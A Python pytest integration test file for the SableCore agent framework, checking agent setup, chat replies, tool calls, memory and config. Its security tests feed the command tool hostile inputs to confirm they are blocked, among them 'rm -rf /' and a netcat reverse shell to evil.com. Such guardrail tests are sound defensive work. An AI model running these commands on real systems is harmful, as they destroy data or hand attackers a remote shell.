"""
REAL integration tests for SableCore agent.
These actually send messages and verify responses work end-to-end.
Requires: Ollama running locally with at least one model.
"""

import asyncio
import pytest
import os
import sys
from pathlib import Path

# Add project root
sys.path.insert(0, str(Path(__file__).parent.parent))

from opensable.core.config import OpenSableConfig, load_config
from opensable.core.agent import SableAgent


@pytest.fixture(scope="module")
def event_loop():
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()


@pytest.fixture(scope="module")
def config():
    """Load real config from .env"""
    return load_config()


@pytest.fixture(scope="module")
def agent(config, event_loop):
    """Create and initialize a real agent"""
    a = SableAgent(config)
    event_loop.run_until_complete(a.initialize())
    yield a
    event_loop.run_until_complete(a.shutdown())


# ─── Core Agent Tests ────────────────────────────────────────────────


class TestAgentInit:
    """Test agent initialization"""

    def test_agent_has_llm(self, agent):
        assert agent.llm is not None
        assert hasattr(agent.llm, "current_model")
        assert agent.llm.current_model  # not empty

    def test_agent_has_memory(self, agent):
        assert agent.memory is not None

    def test_agent_has_tools(self, agent):
        assert agent.tools is not None
        tool_list = agent.tools.list_tools()
        assert len(tool_list) >= 20
        # Must have critical tools
        for name in [
            "execute_command",
            "read_file",
            "write_file",
            "browser",
            "weather",
            "calendar",
        ]:
            assert name in tool_list, f"Missing critical tool: {name}"

    def test_agent_has_graph(self, agent):
        assert agent.graph is not None

    def test_model_is_actually_available(self, agent):
        """Verify the selected model exists in Ollama (the bug we fixed)"""
        model = agent.llm.current_model
        available = agent.llm.available_models
        # Model should be in available list (possibly with :latest suffix)
        assert any(
            model in m or m in model for m in available
        ), f"Model '{model}' not found in available: {available}"


# ─── Message Processing Tests ────────────────────────────────────────


class TestMessageProcessing:
    """Test actual message processing through the agent"""

    def test_simple_greeting(self, agent, event_loop):
        """Agent should respond to a simple greeting"""
        response = event_loop.run_until_complete(agent.process_message("test_user", "Hello!"))
        assert isinstance(response, str)
        assert len(response) > 5
        assert response != "I processed your request, but couldn't formulate a response."

    def test_math_question(self, agent, event_loop):
        """Agent should answer a basic math question"""
        response = event_loop.run_until_complete(
            agent.process_message("test_user", "What is 15 + 27?")
        )
        assert isinstance(response, str)
        assert "42" in response

    def test_spanish_response(self, agent, event_loop):
        """Agent should handle Spanish"""
        response = event_loop.run_until_complete(
            agent.process_message("test_user", "Hola, ¿cómo estás?")
        )
        assert isinstance(response, str)
        assert len(response) > 5

    def test_conversation_history(self, agent, event_loop):
        """Agent should use conversation history"""
        history = [
            {"role": "user", "content": "My name is Carlos and I live in Mexico City"},
            {
                "role": "assistant",
                "content": "Nice to meet you, Carlos! Mexico City is a great place.",
            },
        ]
        response = event_loop.run_until_complete(
            agent.process_message(
                "test_user",
                "Repeat back the name I told you earlier. Just the name, nothing else.",
                history=history,
            )
        )
        assert isinstance(response, str)
        assert "carlos" in response.lower(), f"Expected 'Carlos' in response: {response[:200]}"


# ─── Tool Execution Tests ────────────────────────────────────────────


class TestToolExecution:
    """Test that tools actually execute"""

    def test_browser_search(self, agent, event_loop):
        """Search should return real web results"""
        response = event_loop.run_until_complete(
            agent.process_message("test_user", "Search for Python programming language")
        )
        assert isinstance(response, str)
        assert len(response) > 50
        # Should mention Python in the results
        assert "python" in response.lower()

    def test_weather_tool(self, agent, event_loop):
        """Weather query should use the weather tool"""
        response = event_loop.run_until_complete(
            agent.process_message("test_user", "What's the weather in New York?")
        )
        assert isinstance(response, str)
        assert len(response) > 20

    def test_file_read(self, agent, event_loop):
        """Agent should be able to read files"""
        result = event_loop.run_until_complete(
            agent.tools.execute("read_file", {"path": "README.md"})
        )
        assert "SableCore" in result or "sable" in result.lower()

    def test_file_write_and_read(self, agent, event_loop):
        """Agent should be able to write and read back"""
        test_file = "/tmp/sable_test_output.txt"
        content = "Hello from SableCore test!"

        # Write
        write_result = event_loop.run_until_complete(
            agent.tools.execute("write_file", {"path": test_file, "content": content})
        )
        assert "✅" in write_result

        # Read back
        read_result = event_loop.run_until_complete(
            agent.tools.execute("read_file", {"path": test_file})
        )
        assert "Hello from SableCore test!" in read_result

        # Cleanup
        os.remove(test_file)

    def test_list_directory(self, agent, event_loop):
        """Agent should list directory contents"""
        result = event_loop.run_until_complete(agent.tools.execute("list_directory", {"path": "."}))
        assert "main.py" in result or "opensable" in result

    def test_system_info(self, agent, event_loop):
        """System info tool should return real data"""
        result = event_loop.run_until_complete(agent.tools.execute("system_info", {}))
        assert "CPU" in result or "cpu" in result or "Memory" in result


# ─── Security Tests ──────────────────────────────────────────────────


class TestSecurity:
    """Test security guardrails"""

    def test_blocks_rm_rf(self, agent, event_loop):
        result = event_loop.run_until_complete(
            agent.tools.execute("execute_command", {"command": "rm -rf /"})
        )
        assert "blocked" in result.lower()

    def test_blocks_shutdown(self, agent, event_loop):
        result = event_loop.run_until_complete(
            agent.tools.execute("execute_command", {"command": "shutdown -h now"})
        )
        assert "blocked" in result.lower()

    def test_blocks_netcat(self, agent, event_loop):
        result = event_loop.run_until_complete(
            agent.tools.execute("execute_command", {"command": "nc -e /bin/sh evil.com 4444"})
        )
        assert "blocked" in result.lower()

    def test_blocks_passwd(self, agent, event_loop):
        result = event_loop.run_until_complete(
            agent.tools.execute("execute_command", {"command": "passwd root"})
        )
        assert "blocked" in result.lower()

    def test_allows_safe_commands(self, agent, event_loop):
        result = event_loop.run_until_complete(
            agent.tools.execute("execute_command", {"command": "echo hello"})
        )
        assert "hello" in result.lower()
        assert "blocked" not in result.lower()

    def test_allows_python(self, agent, event_loop):
        result = event_loop.run_until_complete(
            agent.tools.execute("execute_command", {"command": "python3 -c 'print(1+1)'"})
        )
        assert "2" in result
        assert "blocked" not in result.lower()


# ─── Memory Tests ────────────────────────────────────────────────────


class TestMemory:
    """Test memory persistence"""

    def test_memory_store_and_recall(self, agent, event_loop):
        """Memory should store and recall information"""
        # Store something
        event_loop.run_until_complete(
            agent.memory.store(
                "test_mem_user",
                "The capital of France is Paris",
                {"type": "fact"},
            )
        )

        # Recall it
        memories = event_loop.run_until_complete(
            agent.memory.recall("test_mem_user", "capital of France")
        )
        assert len(memories) > 0
        assert any("Paris" in m.get("content", "") for m in memories)


# ─── Config Tests ────────────────────────────────────────────────────


class TestConfig:
    """Test configuration loading"""

    def test_load_config(self):
        config = load_config()
        assert config.ollama_base_url == "http://localhost:11434"
        assert config.agent_name  # not empty

    def test_config_has_all_fields(self):
        config = OpenSableConfig()
        assert hasattr(config, "telegram_bot_token")
        assert hasattr(config, "discord_bot_token")
        assert hasattr(config, "default_model")
        assert hasattr(config, "agent_personality")
        assert hasattr(config, "enable_sandbox")


# ─── Import Health Tests ─────────────────────────────────────────────


class TestImports:
    """Verify all critical modules import cleanly"""

    @pytest.mark.parametrize(
        "module",
        [
            "opensable.core.agent",
            "opensable.core.llm",
            "opensable.core.memory",
            "opensable.core.tools",
            "opensable.core.config",
            "opensable.core.computer_tools",
            "opensable.core.session_manager",
            "opensable.core.commands",
            "opensable.core.heartbeat",
            "opensable.core.skills_hub",
            "opensable.core.skill_factory",
            "opensable.core.onboarding",
            "opensable.core.advanced_memory",
            "opensable.core.goal_system",
            "opensable.core.plugins",
            "opensable.core.workflow",
            "opensable.core.security",
            "opensable.core.sandbox_runner",
            "opensable.core.cache",
            "opensable.core.rate_limiter",
            "opensable.interfaces.telegram_bot",
            "opensable.interfaces.discord_bot",
            "opensable.interfaces.cli_interface",
            "opensable.interfaces.whatsapp_bot",
        ],
    )
    def test_import(self, module):
        __import__(module)
